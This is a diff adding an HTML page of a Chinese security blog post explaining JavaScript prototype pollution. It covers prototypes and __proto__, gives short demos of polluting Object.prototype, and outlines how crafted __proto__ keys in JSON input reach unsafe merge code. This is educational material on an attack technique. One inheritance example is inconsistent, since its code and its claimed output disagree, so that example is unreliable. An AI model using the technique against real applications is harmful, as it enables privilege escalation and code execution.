@@ -1,0 +1,615 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>JS原型链污染（及CVE‑2022‑29078）及与Py的区别 | choco</title><meta name="author" content="Teaaa"><meta name="copyright" content="Teaaa"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="JS原型链污染指的是JavaScript原型链污染，是JavaScript语言特性带来的安全缺陷，不是 Node.js发明或专属的。常和Node.js联系在一起的原因是涉及Node.js后端场景时危害被放大，且攻击面更典型 Node.js并没有“制造”原型链污染，它只是提供了更多接收不可信输入并对其进行对象操作的机会，同时运行在服务端意味着一旦被利用，影响范围更大（所有请求共享同一个运行时原型）。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JS原型链污染（及CVE‑2022‑29078）及与Py的区别">
+<meta property="og:url" content="http://example.com/JSPP/index.html">
+<meta property="og:site_name" content="choco">
+<meta property="og:description" content="JS原型链污染指的是JavaScript原型链污染，是JavaScript语言特性带来的安全缺陷，不是 Node.js发明或专属的。常和Node.js联系在一起的原因是涉及Node.js后端场景时危害被放大，且攻击面更典型 Node.js并没有“制造”原型链污染，它只是提供了更多接收不可信输入并对其进行对象操作的机会，同时运行在服务端意味着一旦被利用，影响范围更大（所有请求共享同一个运行时原型）。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/head.jpg">
+<meta property="article:published_time" content="2026-11-16T05:31:02.981Z">
+<meta property="article:modified_time" content="2026-11-16T08:31:27.652Z">
+<meta property="article:author" content="Teaaa">
+<meta property="article:tag" content="原型链污染">
+<meta property="article:tag" content="Nodejs">
+<meta property="article:tag" content="Web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/head.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "JS原型链污染（及CVE‑2022‑29078）及与Py的区别",
+  "url": "http://example.com/JSPP/",
+  "image": "http://example.com/img/head.jpg",
+  "datePublished": "2026-11-16T05:31:02.981Z",
+  "dateModified": "2026-11-16T08:31:27.652Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Teaaa",
+      "url": "http://www.baidu.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/nailong.jpg"><link rel="canonical" href="http://example.com/JSPP/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.7.1.260810"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.3.1/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        try {
+          const data = { value }
+
+          if (ttl != null) {
+            data.expiry = Date.now() + ttl * 86400000
+          }
+
+          localStorage.setItem(key, JSON.stringify(data))
+        } catch (e) {
+          console.error(e)
+        }
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return
+
+        try {
+          const data = JSON.parse(itemStr)
+
+          if (data.expiry && Date.now() > data.expiry) {
+            localStorage.removeItem(key)
+            return
+          }
+
+          return data.value
+        } catch {
+          localStorage.removeItem(key)
+        }
+      }
+    }
+
+    const scriptCache = new Map()
+    const cssCache = new Map()
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => {
+        if (scriptCache.has(url)) {
+          return scriptCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const script = document.createElement('script')
+
+          script.src = url
+          script.async = true
+
+          for (const key in attr) {
+            script.setAttribute(key, attr[key])
+          }
+
+          script.onload = resolve
+          script.onerror = reject
+
+          document.head.appendChild(script)
+        })
+
+        scriptCache.set(url, promise)
+
+        return promise
+      },
+      getCSS: (url, id) => {
+        if (cssCache.has(url)) {
+          return cssCache.get(url)
+        }
+
+        const promise = new Promise((resolve, reject) => {
+          const link = document.createElement('link')
+
+          link.rel = 'stylesheet'
+          link.href = url
+
+          if (id) {
+            link.id = id
+          }
+
+          link.onload = resolve
+          link.onerror = reject
+
+          document.head.appendChild(link)
+        })
+
+        cssCache.set(url, promise)
+
+        return promise
+      },
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const metaThemeColor = document.querySelector('meta[name="theme-color"]')
+      const activateDarkMode = () => {
+        document.documentElement.dataset.theme = 'dark'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.dataset.theme = 'light'
+        if (metaThemeColor !== null) {
+          metaThemeColor.setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":-1,"unescape":false,"pagination":{"enable":true,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'JS原型链污染（及CVE‑2022‑29078）及与Py的区别',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>
+  /* 明亮模式 */
+  #body-wrap #recent-posts > .recent-post-item,
+  #body-wrap .recent-post-item,
+  #body-wrap #aside-content .card-widget,
+  #body-wrap .layout > div:first-child:not(.recent-posts),
+  #body-wrap #nav .menus_items .menus_item .menus_item_child,
+  #body-wrap #pagination .page-number:not(.current),
+  #body-wrap #pagination .extend {
+      background: rgba(255, 255, 255, 0.95);
+      backdrop-filter: blur(2px);
+      -webkit-backdrop-filter: blur(2px);
+      border: 1px solid rgba(255, 255, 255, 0.85);
+      box-shadow: 0 8px 16px -4px rgba(138, 138, 138, 0.15);
+      transition: background 0.3s ease, border 0.3s ease, box-shadow 0.3s ease;
+  }
+  #body-wrap #pagination .page-number:not(.current):hover,
+  #body-wrap #pagination .extend:hover {
+      background: #ff7142d2;
+      border-color: #ff7142d2;
+      color: #fff;
+  }
+  /* 夜间模式 */
+  html[data-theme="dark"] #body-wrap #recent-posts > .recent-post-item,
+  html[data-theme="dark"] #body-wrap .recent-post-item,
+  html[data-theme="dark"] #body-wrap #aside-content .card-widget,
+  html[data-theme="dark"] #body-wrap .layout > div:first-child:not(.recent-posts),
+  html[data-theme="dark"] #body-wrap #nav .menus_items .menus_item .menus_item_child,
+  html[data-theme="dark"] #body-wrap #pagination .page-number:not(.current),
+  html[data-theme="dark"] #body-wrap #pagination .extend {
+      background: rgba(30, 30, 30, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      box-shadow: 0 8px 16px -4px rgba(0, 0, 0, 0.2);
+  }
+  /*亮色模式强制文字颜色*/
+  .recent-post-item .article-title{
+    color:#111 !important;
+  }
+  .recent-post-item .article-meta-wrap,
+  .recent-post-item .content{
+      color:#222 !important;
+  }
+  /*夜间模式文字颜色*/
+  html[data-theme="dark"] .recent-post-item .article-title{
+    color:#f1f1f1 !important;
+  }
+  html[data-theme="dark"] .recent-post-item .article-meta-wrap,
+  html[data-theme="dark"] .recent-post-item .content{
+    color:#dddddd !important;
+  }
+  
+</style>
+<meta name="generator" content="Hexo 7.3.0"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/dahai.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">35</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://www.baidu.com"><i class="fa-fw fa fa-circle"></i><span> 虫洞</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/yuan.png" alt="Logo"><span class="site-name">choco</span></a><a class="nav-page-title" href="/"><span class="site-name">JS原型链污染（及CVE‑2022‑29078）及与Py的区别</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" target="_blank" rel="noopener" href="http://www.baidu.com"><i class="fa-fw fa fa-circle"></i><span> 虫洞</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">JS原型链污染（及CVE‑2022‑29078）及与Py的区别</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-11-16T05:31:02.981Z" title="发表于 2026-11-16 13:31:02">2026-11-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-11-16T08:31:27.652Z" title="更新于 2026-11-16 16:31:27">2026-11-16</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">6105</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>24 分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p><code>JS</code>原型链污染指的是<code>JavaScript</code>原型链污染，是<code>JavaScript</code>语言特性带来的安全缺陷，不是 <code>Node.js</code>发明或专属的。常和<code>Node.js</code>联系在一起的原因是涉及<code>Node.js</code>后端场景时危害被放大，且攻击面更典型</p>
+<p><code>Node.js</code>并没有“制造”原型链污染，它只是提供了更多<strong>接收不可信输入并对其进行对象操作</strong>的机会，同时运行在服务端意味着一旦被利用，影响范围更大（所有请求共享同一个运行时原型）。</p>
+<table>
+<thead>
+<tr>
+<th align="left">维度</th>
+<th align="left">JavaScript</th>
+<th align="left">Node.js</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">本质</td>
+<td align="left">一种编程语言（ECMAScript 规范的实现）</td>
+<td align="left">一个运行时环境（runtime）</td>
+</tr>
+<tr>
+<td align="left">作用</td>
+<td align="left">定义语法、数据类型、逻辑写法</td>
+<td align="left">提供让 JS 在浏览器之外运行的能力</td>
+</tr>
+<tr>
+<td align="left">依赖</td>
+<td align="left">需要宿主环境才能执行</td>
+<td align="left">本身就是宿主环境</td>
+</tr>
+</tbody></table>
+<h2 id="核心机制"><a href="#核心机制" class="headerlink" title="核心机制"></a>核心机制</h2><p>在<code>JavaScript</code>中，几乎所有的对象都继承自<code>Object.prototype</code>。当你访问一个对象上不存在的属性时，引擎会沿着原型链向上查找，最终到达<code>Object.prototype</code>。</p>
+<p>其实看了<code>Python</code>的也知道大概思路，因此，原型链污染的攻击路径通常是：</p>
+<ul>
+<li>应用代码存在“不安全地合并&#x2F;克隆用户输入对象”或“按路径设置对象属性”的逻辑。</li>
+<li>攻击者构造包含 <code>__proto__</code> 或 <code>constructor.prototype</code> 键的恶意输入（常见于 JSON 请求体）。</li>
+<li>代码在赋值时，意外地沿着这个特殊键访问到了 <code>Object.prototype</code>，并在其上添加或修改了属性。</li>
+<li>此后，该运行时中<strong>所有新建的普通对象</strong>都会“继承”到这个被污染的属性，即使它们与攻击者的输入毫无直接关系。</li>
+</ul>
+<blockquote>
+<p>根据 OWASP 的分类，这可能进一步导致拒绝服务、认证绕过、权限提升，甚至在 Node.js 环境中触发远程代码执行。</p>
+</blockquote>
+<hr>
+<h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><p>虽然之前总结过，但这里还从最基础的开始吧：</p>
+<p>在<code>JavaScript</code>中并没父类和子类的概念，对象是由函数创建的，而函数又是另一种对象。在<code>JavaScript</code>中几乎所有东西都是一种对象。</p>
+<p><code>JS</code>对象本质是键值对集合。访问 <code>obj.xx</code> 时，引擎按固定顺序查找。</p>
+<h2 id="prototype"><a href="#prototype" class="headerlink" title="prototype"></a><code>prototype</code></h2><p>我们以“构造函数”的方式来定义一个类，类中必然有一些方法，类似属性<code>this.bar</code>，也可将方法定义在函数内部：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">show</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> <span class="title class_">Foo</span>()).<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>
+
+<p>可发现此方法是绑定在对象上，而非类中，就会导致一个问题：只要新建一个<code>Foo</code>对象，<code>this.show = function...</code>就会执行一次。</p>
+<p>但我们希望在创建类的时候只创建一次<code>show</code>方法，这时候就则需要使用原型（<code>prototype</code>）了：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">bar</span> = <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">show</span> = <span class="keyword">function</span> <span class="title function_">show</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">bar</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line">foo.<span class="title function_">show</span>()</span><br></pre></td></tr></table></figure>
+
+<p>不难对<code>prototype</code>有一个大概的理解了，可认为原型<code>prototype</code>是类<code>Foo</code>的一个<strong>属性</strong>，而所有用<code>Foo</code>类实例化的对象，都将拥有这个属性中的所有内容，包括变量和方法。比如上图中的<code>foo</code>对象，其天生就具有<code>foo.show()</code>方法。</p>
+<h2 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h2><p>通过<code>Foo.prototype</code>来访问<code>Foo</code>类的原型，但<code>Foo</code>实例化出来的对象，是不能通过<code>prototype</code>访问原型的，这时候，需要用到<code>__proto__</code>了。</p>
+<p>一个<code>Foo</code>类实例化出来的<code>foo</code>对象，可以通过<code>foo.__proto__</code>属性来访问<code>Foo</code>类的原型，也就是说：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">foo.<span class="property">__proto__</span> == <span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<ul>
+<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
+<li>每个对象都有一个名为<code>__proto__</code>的内置属性，它指向该对象的原型，每个函数&#x2F;类也都有一个名为 <code>prototype </code>的属性，它指向该函数或类的原型</li>
+<li>当一个类实例化后会用于<code>prototype</code>中所有的属性和方法</li>
+</ul>
+</blockquote>
+<h2 id="原型-原型链"><a href="#原型-原型链" class="headerlink" title="原型&amp;原型链"></a>原型&amp;原型链</h2><p>几乎所有的对象都有一个隐秘的链接 ，指向另一个称为其 “原型” （<code>prototype</code>）的对象。当你试图访问一个对象的属性时，如果这个对象自身没有该属性，<code>JavaScript</code>引擎就会沿着这个链接去它的原型对象上找，如果原型对象上也没有，就继续去原型的原型上找，直到找到属性或者到达链条的尽头（ <code>null</code> ）。这条由原型对象连接起来的路径，就是 原型链 。</p>
+<blockquote>
+<p>关于这一块可参考：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Inheritance_and_the_prototype_chain">继承与原型链 - JavaScript | MDN</a></p>
+</blockquote>
+<h3 id="每个对象都有内部原型"><a href="#每个对象都有内部原型" class="headerlink" title="每个对象都有内部原型"></a>每个对象都有内部原型</h3><ul>
+<li>普通对象通过 <code>[[Prototype]]</code> 指向另一个对象，访问器是 <code>__proto__</code>（历史遗留，但真实存在）。</li>
+<li>函数有 <code>prototype</code> 属性，指向一个对象，这个对象会成为该函数构造出的实例的原型。</li>
+<li>构造器函数本身也有 <code>[[Prototype]]</code>，通常指向 <code>Function.prototype</code>。</li>
+</ul>
+<h3 id="链的终点是-Object-prototype"><a href="#链的终点是-Object-prototype" class="headerlink" title="链的终点是 Object.prototype"></a>链的终点是 <code>Object.prototype</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">实例 obj → 构造器.prototype → ... → Object.prototype → null</span><br></pre></td></tr></table></figure>
+
+<p><code>Object.prototype</code> 是绝大多数普通对象共享的<strong>同一个对象</strong>。改它，等于改所有对象的默认行为。</p>
+<h2 id="原型链继承"><a href="#原型链继承" class="headerlink" title="原型链继承"></a>原型链继承</h2><p>所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现<code>JavaScript</code>中的继承机制。即当一个对象试图访问一个属性或方法时，如果在该对象自身没有找到，<code>JavaScript</code>会沿着原型链向上查找，直到找到对应的属性或方法，或者达到原型链的顶端 <code>null</code> 为止。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function Father()&#123;</span><br><span class="line">    this.firstName = &quot;Spring&quot;;</span><br><span class="line">    this.lastName = &quot;summer&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Son() &#123;</span><br><span class="line">    this.firstName = &quot;Winter&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Son.prototype = new Father();</span><br><span class="line"></span><br><span class="line">const son = new Son();</span><br><span class="line">console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`)</span><br><span class="line">// Winter summer</span><br></pre></td></tr></table></figure>
+
+<p>我们让<code>Son</code>的原型为<code>Father</code>对象实例，则<code>Son</code>类会继承<code>Father</code>类所有属性和方法，所以会输出<code>Father</code>类的姓<code>john</code></p>
+<p>而输出儿子名字并没有变，从继承机制可知，在<code>Son</code>类找得到这个属性，所以不会再顺着原型链往上找。</p>
+<blockquote>
+<p>总结一下，对于对象<code>son</code>，在调用<code>son.last_name</code>的时候，实际上<code>JavaScript</code>引擎会进行如下操作：</p>
+<ul>
+<li>在对象<code>son</code>中寻找<code>last_name</code></li>
+<li>如果找不到，则在<code>son.__proto__</code>中寻找<code>last_name</code></li>
+<li>如果仍然找不到，则继续在<code>son.__proto__.__proto__</code>中寻找<code>last_name</code></li>
+<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
+</ul>
+</blockquote>
+<p><code>JavaScript</code>的这个查找的机制，被运用在面向对象的继承中，被称作<code>prototype</code>继承链。</p>
+<p>以上就是最基础的<code>JavaScript</code>面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p>
+<blockquote>
+<ol>
+<li>每个构造函数(<code>constructor</code>)都有一个原型对象(<code>prototype</code>)</li>
+<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
+<li><code>JavaScript</code>使用<code>prototype</code>链实现继承机制</li>
+</ol>
+</blockquote>
+<hr>
+<h1 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h1><p>前面<code>__proto__</code>二级标题说，<code>Foo</code>类实例化出来的<code>foo</code>对象，可以通过<code>foo.__proto__</code>属性来访问<code>Foo</code>类的原型<code>Foo.prototype</code>。</p>
+<p>那么因为对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code>，如果我们修改了<code>foo.__proto__</code>中的值，是不是就可以修改<code>Foo</code>类呢？</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo 是普通对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123; <span class="attr">bar</span>: <span class="number">1</span> &#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>) <span class="comment">// 输出：1  ，来自 foo 自身 __dict__</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.__proto__ === Object.prototype</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">bar</span> = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// foo 自己身上已经有 bar，优先读自身，不受影响</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">bar</span>) <span class="comment">// 输出：1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"><span class="comment">// zoo 自身没有 bar，向上查到 Object.prototype.bar</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(zoo.<span class="property">bar</span>) <span class="comment">// 输出：2</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>修改的是什么</p>
+<ul>
+<li><code>foo.__proto__</code>指向的是<code>Object.prototype</code>，不是<code>Object</code>这个类（构造函数本身）；</li>
+<li>修改<code>foo.__proto__</code>，是修改<strong>原型对象</strong>，不是修改构造函数 <code>Object</code>；</li>
+<li>所有以<code>Object.prototype</code>为原型的普通对象，都会共享这个原型上新增 &#x2F; 修改的属性，这正是 JS 原型链污染的根源。</li>
+</ul>
+</blockquote>
+<p>最后，虽然<code>zoo</code>是一个<strong>空</strong>对象<code>&#123;&#125;</code>，但<code>zoo.bar</code>的执行结果是2，这就说明链已经被污染了</p>
+<blockquote>
+<p>修改了<code>foo</code>的原型<code>foo.__proto__.bar = 2</code>，而<code>foo</code>是一个<code>Object</code>类的实例，所以实际上是修改了<code>Object</code>这个类，给这个类增加了一个属性<code>bar</code>，值为2。</p>
+<p>后来，我们又用<code>Object</code>类创建了一个<code>zoo</code>对象<code>let zoo = &#123;&#125;</code>，<code>zoo</code>对象自然也有一个<code>bar</code>属性了。</p>
+</blockquote>
+<p>那么，在一个应用中，如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是<strong>原型链污染</strong>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建构造函数 Foo（可以理解成我们自己写的“类”）</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="comment">// 给 Foo 的原型对象预先挂上一个属性 msg</span></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">msg</span> = <span class="string">&quot;original&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 用 Foo 新建实例 foo</span></span><br><span class="line"><span class="keyword">let</span> foo = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(foo.<span class="property">msg</span>) <span class="comment">// 输出：original，沿着原型链找到 Foo.prototype</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改 foo 的隐式原型上的属性</span></span><br><span class="line">foo.<span class="property">__proto__</span>.<span class="property">msg</span> = <span class="string">&quot;polluted&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 再新建另外一个 Foo 的实例 bar</span></span><br><span class="line"><span class="keyword">let</span> bar = <span class="keyword">new</span> <span class="title class_">Foo</span>()</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(bar.<span class="property">msg</span>) <span class="comment">// 输出：polluted</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 新建一个普通对象，它的原型不是 Foo.prototype，不受影响</span></span><br><span class="line"><span class="keyword">let</span> normalObj = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(normalObj.<span class="property">msg</span>) <span class="comment">// 输出：undefined</span></span><br></pre></td></tr></table></figure>
+
+<p>修改的是什么</p>
+<blockquote>
+<ul>
+<li><code>foo.__proto__</code> 指向 <code>Foo.prototype</code>，不是构造函数 <code>Foo</code> 本身；</li>
+<li><code>foo.__proto__.msg = &quot;polluted&quot;</code> 修改的是【原型对象】，不是直接修改 Foo；</li>
+<li>所有通过 <code>new Foo()</code> 创建出来、并且自身没有 <code>msg</code> 属性的实例，都会共享这个原型上的属性；以 <code>Object.prototype</code> 为原型的普通对象不受这次修改影响。</li>
+</ul>
